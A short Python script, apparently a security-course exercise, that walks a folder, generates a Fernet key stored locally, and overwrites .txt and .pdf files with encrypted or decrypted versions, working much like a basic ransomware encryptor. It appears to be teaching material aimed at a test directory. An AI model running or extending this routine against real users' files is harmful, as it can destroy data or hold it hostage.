import os
from cryptography.fernet import Fernet

# safeguard = input("Please enter the safeguard password:")
# if safeguard != 'start':
#     quit()

#creates list of files of certain extensions within given folder
def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf',)
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_path,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    return file_paths

#creates fernet key and writes it to text file
def write_key():
    key = Fernet.generate_key()

    with open('filekey.txt', 'wb') as filekey:
        filekey.write(key)

#reads and returns key stored in filekey.txt
def read_key():
    with open('filekey.txt', 'rb') as filekey:
        key = filekey.read()

    fernet = Fernet(key)
    return fernet

#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            encrypted = fernet.encrypt(file.read())
        
        #overwrite the original with the new encrypted version
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet):
    for f in file_paths:
        #create decrypted version of the file
        with open(f, 'rb') as enc_file:
            decrypted = fernet.decrypt(enc_file.read())
        
        #overwrite the original with the new decrypted version
        with open(f, 'wb') as dec_file:
            dec_file.write(decrypted)

#sequence to generate a new key and encrypt files with it
def encrypt(file_paths):
    write_key()
    fernet = read_key()
    encrypt_files(file_paths, fernet)

#sequence to decrypt the already encrypted files using the key that already exists
#returns error if files weren't encrypted beforehand
def decrypt(file_paths):
    fernet = read_key()
    decrypt_files(file_paths, fernet)

def main():
    file_paths = generate_file_list('C:\\Users\\ericw\\Documents\\CECS378Test')

    for f in file_paths:
        print(f)

    decrypt(file_paths)

if __name__ == "__main__":
    main()


